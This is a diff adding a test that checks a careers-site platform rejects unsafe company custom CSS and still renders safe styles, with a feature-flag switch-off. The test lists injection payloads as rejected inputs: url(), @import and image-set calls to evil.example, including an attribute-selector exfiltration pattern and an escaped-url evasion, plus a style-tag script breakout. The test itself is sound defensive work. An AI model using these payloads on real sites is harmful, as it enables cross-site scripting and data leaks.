@@ -332,6 +332,36 @@ test("C2 - careers page theme (colours, fonts, style)", async () => {
   assert.ok(!css(await (await fetch(`${BASE}/careers/${S.slugA}`)).text()).includes("--background:"), "empty background = follow light/dark");
 });
 
+test("C4 - company custom CSS on careers pages (CSS only, nothing that loads resources)", async () => {
+  const brand = (payload) => owner.cmd(S.A.id, "settings.branding", payload);
+  for (const bad of [
+    ".careers-hero { background: url(https://evil.example/x.png) }",
+    "</style><script>alert(1)</script>",
+    "@import 'https://evil.example/a.css';",
+    ".x { background: u\\72l(https://evil.example) }",
+    "input[value^=a] { background-image: image-set('https://evil.example/a' 1x) }",
+    "@font-face { font-family: X; src: local(Arial) }",
+  ]) assert.equal((await brand({ customCss: bad })).status, 400, bad);
+  const css = ".careers-headline { letter-spacing: -0.04em; }\n.careers-button { border-radius: 999px; }";
+  assert.equal((await brand({ customCss: css })).status, 200);
+  const page = await (await fetch(`${BASE}/careers/${S.slugA}`)).text();
+  assert.ok(page.includes("<style data-custom-css") && page.includes(".careers-headline { letter-spacing: -0.04em; }"), "custom CSS on the careers page");
+  assert.ok(page.includes('class="careers-headline'), "stable class names");
+  assert.ok((await (await fetch(`${BASE}/careers/${S.slugA}/${S.jobSlugA}`)).text()).includes("data-custom-css"), "and on the job page");
+  // Stored values are checked again before rendering, and the platform switch turns it off.
+  const db = new pg.Client({ connectionString: DB });
+  await db.connect();
+  await db.query("update organizations set branding = branding || jsonb_build_object('customCss', $2::text) where id = $1", [S.A.id, ".x{background:url(https://evil.example)}"]);
+  assert.ok(!(await (await fetch(`${BASE}/careers/${S.slugA}`)).text()).includes("evil.example"), "unsafe stored CSS isn't rendered");
+  await db.query("update organizations set branding = branding || jsonb_build_object('customCss', $2::text) where id = $1", [S.A.id, css]);
+  await db.query("insert into org_features (org_id, feature_key, enabled) values ($1, 'custom_branding', false) on conflict (org_id, feature_key) do update set enabled = false", [S.A.id]);
+  const off = await (await fetch(`${BASE}/careers/${S.slugA}`)).text();
+  await db.query("delete from org_features where org_id = $1 and feature_key = 'custom_branding'", [S.A.id]);
+  await db.end();
+  assert.ok(!off.includes("data-custom-css"), "off when custom branding is off");
+  assert.equal((await brand({ customCss: "" })).status, 200);
+});
+
 test("C3 - optional Nice to have list on the job page", async () => {
   const page = async () => (await fetch(`${BASE}/careers/${S.slugA}/${S.jobSlugA}?lang=en`)).text();
   assert.ok(!(await page()).includes(">Nice to have</h2>"), "hidden while empty");
